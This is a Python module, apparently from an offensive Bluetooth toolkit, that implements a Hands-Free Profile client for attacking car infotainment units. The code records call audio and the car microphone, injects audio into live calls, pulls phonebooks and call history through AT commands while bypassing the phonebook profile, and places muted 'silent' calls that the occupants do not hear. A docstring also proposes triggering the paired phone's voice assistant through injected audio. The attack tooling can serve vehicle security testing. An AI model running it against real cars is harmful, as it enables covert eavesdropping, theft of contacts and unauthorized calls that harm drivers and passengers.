"""HFP (Hands-Free Profile) for call audio interception and injection.

HFP uses RFCOMM for AT command control and SCO (Synchronous Connection-Oriented)
links for audio transport. The IVI typically acts as HFP Audio Gateway (AG).

Attack flow:
1. Connect RFCOMM to HFP AG channel
2. Complete SLC (Service Level Connection) handshake via AT commands
3. Establish SCO audio link
4. Capture/inject PCM audio from SCO socket

AT Command Reference (HFP 1.7):
  AT+BRSF=<features>  - Supported features exchange
  AT+CIND=?           - Indicator mapping query
  AT+CIND?            - Current indicator values
  AT+CMER=3,0,0,1     - Enable indicator reporting
  AT+CHLD=?           - Call hold/multiparty features
  AT+COPS?            - Network operator
  AT+CLCC             - Current call list
  ATD<number>;        - Dial number
  AT+CHUP             - Hang up
  ATA                 - Answer incoming call
  AT+VGS=<level>      - Speaker volume
  AT+VGM=<level>      - Microphone volume
  AT+NREC=0           - Disable echo cancellation (IVI side)
"""

import os
import re
import socket
import time
import wave

from blue_tap.utils.output import info, success, error, warning


# HFP Supported Features bitmask (as HF unit)
HFP_HF_FEATURES = (
    0x01 |  # EC/NR function
    0x02 |  # Three-way calling
    0x04 |  # CLI presentation
    0x08 |  # Voice recognition
    0x10 |  # Remote volume control
    0x20 |  # Enhanced call status
    0x40    # Enhanced call control
)


class HFPClient:
    """HFP Hands-Free client for connecting to IVI Audio Gateway.

    Usage:
        hfp = HFPClient("AA:BB:CC:DD:EE:FF", channel=10)
        hfp.connect()
        hfp.setup_slc()           # Service Level Connection
        hfp.setup_audio()         # SCO audio link
        hfp.capture_audio("call_capture.wav", duration=60)
        hfp.inject_audio("audio.wav")
        hfp.disconnect()
    """

    def __init__(self, address: str, channel: int | None = None):
        self.address = address
        self.channel = channel
        self.rfcomm_sock = None
        self.sco_sock = None
        self.ag_features = 0
        self.indicators = {}
        self.indicator_values = {}
        self.slc_established = False
        self.audio_rate = 8000  # Default CVSD; updated to 16000 if mSBC negotiated
        self.audio_codec = "CVSD"

    def connect(self) -> bool:
        """Connect RFCOMM to HFP Audio Gateway."""
        if self.channel is None:
            error("No RFCOMM channel specified. Use SDP to discover the HFP channel.")
            return False
        info(f"Connecting HFP to {self.address} channel {self.channel}...")
        for attempt in range(2):
            try:
                self.rfcomm_sock = socket.socket(
                    socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM
                )
                self.rfcomm_sock.settimeout(5.0)
                self.rfcomm_sock.connect((self.address, self.channel))
                success(f"HFP RFCOMM connected to {self.address} channel {self.channel}")
                return True
            except OSError as e:
                # Close failed socket before retry to prevent leak
                if self.rfcomm_sock:
                    try:
                        self.rfcomm_sock.close()
                    except OSError:
                        pass
                    self.rfcomm_sock = None
                if attempt == 0:
                    warning(f"RFCOMM connection failed ({e}), retrying in 2s...")
                    time.sleep(2)
                    continue
                error(f"RFCOMM connection failed after retry: {e}")
                return False
        return False

    def disconnect(self):
        """Disconnect HFP."""
        if self.sco_sock:
            try:
                self.sco_sock.close()
            except OSError:
                pass
            self.sco_sock = None

        if self.rfcomm_sock:
            try:
                self.rfcomm_sock.close()
            except OSError:
                pass
            self.rfcomm_sock = None

        self.slc_established = False
        info("HFP disconnected")

    def setup_slc(self) -> bool:
        """Establish Service Level Connection (SLC) with AT command handshake."""
        info("Setting up HFP Service Level Connection...")

        # Step 1: Exchange supported features (mandatory for SLC)
        response = self._send_at(f"AT+BRSF={HFP_HF_FEATURES}")
        if "+BRSF:" in response:
            try:
                brsf_str = response.split(":")[1].strip().split("\r")[0]
                self.ag_features = int(brsf_str)
                info(f"AG features: 0x{self.ag_features:04x}")
            except (IndexError, ValueError):
                warning(f"Could not parse AG features from BRSF response: {response[:80]}")
                self.ag_features = 0
        elif not response or "ERROR" in response:
            error("SLC failed: feature exchange (AT+BRSF) rejected or no response")
            return False

        # Step 2: Get indicator mapping (mandatory for SLC)
        response = self._send_at("AT+CIND=?")
        if "+CIND:" in response:
            self._parse_indicator_mapping(response)
            info(f"Indicators: {list(self.indicators.keys())}")
        elif not response or "ERROR" in response:
            error("SLC failed: indicator query (AT+CIND=?) rejected or no response")
            return False

        # Step 3: Get current indicator values
        response = self._send_at("AT+CIND?")
        if "+CIND:" in response:
            self._parse_indicator_values(response)

        # Step 4: Enable indicator status reporting
        response = self._send_at("AT+CMER=3,0,0,1")
        if "OK" not in response:
            warning("Indicator reporting may not be enabled")

        # Step 5: Query call hold features (optional)
        self._send_at("AT+CHLD=?")

        self.slc_established = True
        success("HFP SLC established")
        return True

    def setup_audio(self) -> bool:
        """Establish SCO audio connection.

        SCO provides the actual audio channel for calls.
        Audio format: 8000 Hz, 16-bit signed, mono (CVSD) or mSBC.
        """
        info("Setting up SCO audio link...")
        for attempt in range(2):
            try:
                self.sco_sock = socket.socket(
                    socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_SCO
                )
                self.sco_sock.connect((self.address,))
                self.sco_sock.settimeout(1.0)
                success("SCO audio link established")
                return True
            except OSError as e:
                # Close failed socket before retry or final return
                if self.sco_sock:
                    try:
                        self.sco_sock.close()
                    except OSError:
                        pass
                    self.sco_sock = None
                if attempt == 0:
                    warning(f"SCO connection failed ({e}), retrying in 2s...")
                    time.sleep(2)
                    continue
                error(f"SCO setup failed after retry: {e}")
                warning("SCO may require root and specific adapter support")
                warning("Try: sudo btmgmt power off && sudo btmgmt sco-setup on && sudo btmgmt power on")
                return False
        return False

    def capture_audio(self, output_file: str = "hfp_capture.wav",
                       duration: int = 60, sample_rate: int = 8000,
                       use_parecord: bool = True) -> str:
        """Capture call audio to WAV file.

        Primary method: parecord via PulseAudio (proven reliable per real testing).
        Fallback: raw SCO socket capture.

        Args:
            output_file: Output WAV file path
            duration: Capture duration in seconds
            sample_rate: Audio sample rate (8000 for CVSD, 16000 for mSBC)
            use_parecord: Use parecord instead of raw SCO (recommended)
        """
        if use_parecord:
            # Use the proven PulseAudio approach from real IVI attacks
            from blue_tap.attack.a2dp import record_car_mic
            return record_car_mic(self.address, output_file, duration)

        if not self.sco_sock:
            if not self.setup_audio():
                return ""

        info(f"Capturing audio via SCO for {duration}s -> {output_file}")
        frames = []
        end_time = time.time() + duration

        while time.time() < end_time:
            try:
                data = self.sco_sock.recv(480)  # Typical SCO packet size
                if data:
                    frames.append(data)
            except TimeoutError:
                continue
            except OSError as e:
                error(f"Audio capture error: {e}")
                break

        if not frames:
            warning("No audio frames captured via SCO")
            return ""

        audio_data = b"".join(frames)
        # Use instance audio_rate (set by codec negotiation) if available
        effective_rate = getattr(self, "audio_rate", None) or sample_rate
        with wave.open(output_file, "wb") as wf:
            wf.setnchannels(1)
            wf.setsampwidth(2)  # 16-bit
            wf.setframerate(effective_rate)
            wf.writeframes(audio_data)
        success(f"Captured {len(audio_data)} bytes ({effective_rate}Hz) -> {output_file}")
        return output_file

    def inject_audio(self, audio_file: str, sample_rate: int = 8000,
                      use_paplay: bool = False) -> bool:
        """Inject audio into the call (plays through IVI speakers via SCO).

        For call audio injection, SCO is required (not A2DP).
        A2DP is for media streaming and won't inject into an active call.
        The audio file should be WAV format, mono, 16-bit, 8000/16000 Hz.

        Args:
            audio_file: Path to WAV file
            sample_rate: Audio sample rate
            use_paplay: Use paplay to default BT sink (only works for media, not calls)
        """
        if use_paplay:
            warning("paplay uses A2DP which doesn't inject into active calls")
            warning("Using SCO injection instead for call audio")
            use_paplay = False

        if not self.sco_sock:
            if not self.setup_audio():
                return False

        if not os.path.exists(audio_file):
            error(f"Audio file not found: {audio_file}")
            return False

        info(f"Injecting audio: {audio_file}")
        try:
            with wave.open(audio_file, "rb") as wf:
                # Validate format
                if wf.getnchannels() != 1:
                    warning(f"Expected mono, got {wf.getnchannels()} channels")
                if wf.getsampwidth() != 2:
                    warning(f"Expected 16-bit, got {wf.getsampwidth()*8}-bit")

                chunk_size = 480  # SCO packet payload
                data = wf.readframes(wf.getnframes())
                offset = 0

                while offset < len(data):
                    chunk = data[offset:offset + chunk_size]
                    if len(chunk) < chunk_size:
                        chunk += b"\x00" * (chunk_size - len(chunk))
                    try:
                        self.sco_sock.send(chunk)
                    except OSError as e:
                        error(f"Inject error: {e}")
                        return False
                    offset += chunk_size
                    time.sleep(chunk_size / (sample_rate * 2))  # Pace output

            success(f"Audio injection complete: {audio_file}")
            return True
        except Exception as e:
            error(f"Injection failed: {e}")
            return False

    def send_at(self, command: str) -> str:
        """Send raw AT command (exposed for manual interaction)."""
        return self._send_at(command)

    def dial(self, number: str) -> str:
        """Initiate a call via the IVI."""
        info(f"Dialing: {number}")
        return self._send_at(f"ATD{number};", timeout=30.0)

    def answer(self) -> str:
        """Answer an incoming call."""
        return self._send_at("ATA")

    def hangup(self) -> str:
        """Hang up current call."""
        return self._send_at("AT+CHUP")

    def get_call_list(self) -> str:
        """Get current call list."""
        return self._send_at("AT+CLCC")

    def get_operator(self) -> str:
        """Get network operator name."""
        return self._send_at("AT+COPS?")

    def get_subscriber_number(self) -> str:
        """Get subscriber number (phone number)."""
        return self._send_at("AT+CNUM")

    def set_volume(self, speaker: int = 15, mic: int = 15):
        """Set speaker and microphone volume (0-15)."""
        self._send_at(f"AT+VGS={speaker}")
        self._send_at(f"AT+VGM={mic}")

    def disable_nrec(self) -> str:
        """Disable Noise Reduction and Echo Canceling on AG (IVI side).
        This can improve audio capture quality.
        """
        return self._send_at("AT+NREC=0")

    def dtmf(self, digit: str) -> str:
        """Send a single DTMF tone (0-9, *, #, A-D)."""
        valid = set("0123456789*#ABCD")
        if len(digit) != 1 or digit.upper() not in valid:
            error(f"Invalid DTMF digit: {digit!r} (must be 0-9, *, #, A-D)")
            return ""
        return self._send_at(f"AT+VTS={digit.upper()}")

    def dtmf_sequence(self, digits: str, interval: float = 0.3) -> list[str]:
        """Send multiple DTMF tones with a delay between each."""
        results = []
        for i, digit in enumerate(digits):
            results.append(self.dtmf(digit))
            if i < len(digits) - 1:
                time.sleep(interval)
        return results

    def call_hold(self, action: int) -> str:
        """Send call hold/multiparty command (AT+CHLD).

        Actions: 0=release all held, 1=release active+accept held,
        2=hold active+accept held, 3=conference, 4=connect two calls+disconnect.
        """
        if action not in range(5):
            error(f"Invalid CHLD action: {action} (must be 0-4)")
            return ""
        return self._send_at(f"AT+CHLD={action}")

    def redial(self) -> str:
        """Redial last dialed number."""
        return self._send_at("AT+BLDN")

    def voice_recognition(self, enable: bool) -> str:
        """Enable or disable voice recognition on the AG.

        When enabled, triggers Siri/Google Assistant/Alexa on the paired phone.
        Combined with audio injection, this can be used to:
          - Issue voice commands to the phone through the IVI
          - Trigger voice assistant actions silently
        """
        return self._send_at(f"AT+BVRA={1 if enable else 0}")

    def negotiate_codec(self, prefer_msbc: bool = True) -> bool:
        """Negotiate audio codec with the AG (CVSD or mSBC).

        mSBC (modified SBC) provides 16kHz wideband audio vs CVSD's 8kHz.
        Modern IVIs support mSBC for higher quality calls.

        HFP 1.6+ codec negotiation:
          1. HF sends AT+BAC=1,2 (supported codecs: 1=CVSD, 2=mSBC)
          2. AG sends +BCS:<codec_id> to select codec
          3. HF confirms with AT+BCS=<codec_id>
        """
        if prefer_msbc:
            codecs = "1,2"  # CVSD + mSBC
        else:
            codecs = "1"  # CVSD only

        response = self._send_at(f"AT+BAC={codecs}")
        if "OK" not in response and "ERROR" not in response:
            warning("Codec negotiation not supported by AG")
            return False

        # AG may send +BCS asynchronously — check for it
        if "+BCS:" in response:
            try:
                codec_id = response.split("+BCS:")[1].strip().split()[0]
            except (IndexError, ValueError):
                warning(f"Could not parse codec selection from response: {response[:80]}")
                return False
            self._send_at(f"AT+BCS={codec_id}")
            if codec_id == "2":
                self.audio_rate = 16000
                self.audio_codec = "mSBC"
                info("Codec negotiated: mSBC (16kHz wideband)")
            else:
                self.audio_rate = 8000
                self.audio_codec = "CVSD"
                info("Codec negotiated: CVSD (8kHz narrowband)")
            return True

        info("Codec list sent — AG will select during next audio connection")
        return True

    def get_phonebook_via_at(self, memory: str = "ME",
                              start: int = 1, end: int = 200) -> list[dict]:
        """Extract phonebook directly via AT commands (bypasses PBAP).

        Many IVIs support AT+CPBS/AT+CPBR even when PBAP is restricted.
        This is a fallback extraction method.

        Memory types:
          ME = Phone memory    SM = SIM    DC = Dialed calls
          RC = Received calls  MC = Missed calls  FD = Fixed dialing
          ON = Own numbers
        """
        info(f"Extracting phonebook via AT (memory={memory}, range={start}-{end})...")

        # Select phonebook memory
        response = self._send_at(f'AT+CPBS="{memory}"')
        if "ERROR" in response:
            warning(f"Cannot select memory {memory}")
            return []

        # Read entries
        response = self._send_at(f"AT+CPBR={start},{end}", timeout=15.0)
        entries = []
        for line in response.splitlines():
            line = line.strip()
            if line.startswith("+CPBR:"):
                parts = line[6:].split(",", 3)
                if len(parts) >= 4:
                    entries.append({
                        "index": parts[0].strip(),
                        "number": parts[1].strip().strip('"'),
                        "type": parts[2].strip(),
                        "name": parts[3].strip().strip('"'),
                    })

        if entries:
            success(f"Extracted {len(entries)} phonebook entries from {memory}")
        else:
            warning(f"No entries found in {memory}")
        return entries

    def get_call_history_via_at(self) -> dict:
        """Extract call history (dialed, received, missed) via AT commands."""
        history = {}
        for mem, desc in [("DC", "Dialed"), ("RC", "Received"), ("MC", "Missed")]:
            entries = self.get_phonebook_via_at(mem)
            if entries:
                history[desc] = entries
        return history

    def silent_call(self, number: str) -> bool:
        """Initiate a call with volume muted (stealth dial).

        Dials the number then mutes the speaker and mic
        so the car occupant doesn't hear the call.
        """
        info(f"Silent call to {number}...")
        result = self._send_at(f"ATD{number};", timeout=30)
        if "OK" not in result and "ERROR" in result:
            error(f"Dial failed: {result}")
            return False
        # Wait for call setup before muting — immediate mute races with audio start
        time.sleep(1.5)
        self._send_at("AT+VGS=0")  # Speaker volume 0
        self._send_at("AT+VGM=0")  # Mic volume 0
        success("Call initiated with volume muted")
        return True

    def wait_for_incoming(self, timeout: int = 300) -> dict | None:
        """Wait for an incoming call and extract caller ID.

        Listens for RING and +CLIP (Calling Line Identification) unsolicited
        results from the AG.

        Returns:
            {"number": "+1234567890", "name": "John Doe", "type": 145} or None
        """
        info(f"Waiting for incoming call ({timeout}s)...")

        # Enable CLIP (caller ID presentation)
        self._send_at("AT+CLIP=1")

        deadline = time.time() + timeout
        buffer = b""

        while time.time() < deadline:
            try:
                data = self.rfcomm_sock.recv(1024)
                if data:
                    buffer += data
                    text = buffer.decode("utf-8", errors="replace")

                    if "RING" in text or "+CLIP:" in text:
                        result = {"number": "", "name": "", "type": 0}
                        # Parse +CLIP: "number",type,,"name"
                        clip_m = re.search(
                            r'\+CLIP:\s*"([^"]*)",\s*(\d+)(?:,\s*,\s*"([^"]*)")?',
                            text
                        )
                        if clip_m:
                            result["number"] = clip_m.group(1)
                            result["type"] = int(clip_m.group(2))
                            if clip_m.group(3):
                                result["name"] = clip_m.group(3)
                        success(f"Incoming call: {result['number']} ({result.get('name', 'Unknown')})")
                        return result
            except TimeoutError:
                continue
            except OSError:
                break

        info("No incoming call detected")
        return None

    def _send_at(self, command: str, timeout: float = 5.0) -> str:
        """Send AT command and receive response.

        Args:
            command: AT command string
            timeout: Response timeout in seconds (default 5s, use longer for ATD)
        """
        if not self.rfcomm_sock:
            error("Not connected")
            return ""

        try:
            # Standard AT format: command followed by \r (no leading \r\n)
            cmd = f"{command}\r"
            self.rfcomm_sock.send(cmd.encode())

            # Collect response
            response = b""
            deadline = time.time() + timeout
            while time.time() < deadline:
                try:
                    data = self.rfcomm_sock.recv(1024)
                    if data:
                        response += data
                        # Check for final result codes
                        text = response.decode("utf-8", errors="replace")
                        if any(code in text for code in ["OK", "ERROR", "+CME ERROR"]):
                            break
                except TimeoutError:
                    continue
                except OSError:
                    break  # Socket closed — return what we have

            # Normalize line endings for cross-platform tolerance
            result = response.decode("utf-8", errors="replace")
            result = result.replace("\r\n", "\n").replace("\r", "\n").strip()
            if result:
                info(f"AT> {command}")
                for line in result.splitlines():
                    line = line.strip()
                    if line:
                        info(f"  < {line}")
            return result

        except OSError as e:
            error(f"AT command failed: {e}")
            return ""

    def _parse_indicator_mapping(self, response: str):
        """Parse +CIND=? response for indicator names."""
        # Match indicator names which may contain hyphens (e.g., "battery-level")
        indicators = re.findall(r'\("([\w-]+)"', response)
        if not indicators:
            warning(f"No indicators found in CIND mapping: {response[:80]}")
            return
        for i, name in enumerate(indicators):
            self.indicators[name] = i

    def _parse_indicator_values(self, response: str):
        """Parse +CIND? response for current indicator values.

        Stores values in self.indicator_values (separate from the
        name-to-index mapping in self.indicators).
        """
        try:
            values_str = response.split(":")[1].strip().split("\r")[0]
        except (IndexError, AttributeError):
            warning(f"Could not parse indicator values: {response[:80]}")
            return
        values = re.findall(r"(\d+)", values_str)
        self.indicator_values = {}
        indicator_names = list(self.indicators.keys())
        for i, val in enumerate(values):
            if i < len(indicator_names):
                try:
                    self.indicator_values[indicator_names[i]] = int(val)
                except ValueError:
                    pass
